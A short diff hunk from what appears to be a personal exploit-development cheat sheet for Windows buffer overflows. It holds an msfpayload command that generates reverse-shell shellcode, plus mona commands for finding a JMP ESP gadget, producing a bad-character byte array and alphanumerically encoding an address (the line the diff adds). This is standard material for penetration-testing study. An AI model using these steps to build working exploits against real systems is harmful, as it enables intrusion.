@@ -25,6 +25,9 @@ msfpayload win32_reverse LHOST=127.0.0.1 EXITFUNC=thread LPORT=1337 -b  "\x00" C
 
 !mona jmp -r ESP
 
+# Stick an address in EAX when restricted by characters
+!mona encode -t alphanum -s '\xa9\xfa\x12\x00'
+
 # Generate bad characters, minus \x00
 !mona bytearray -b '\x00'						          
 
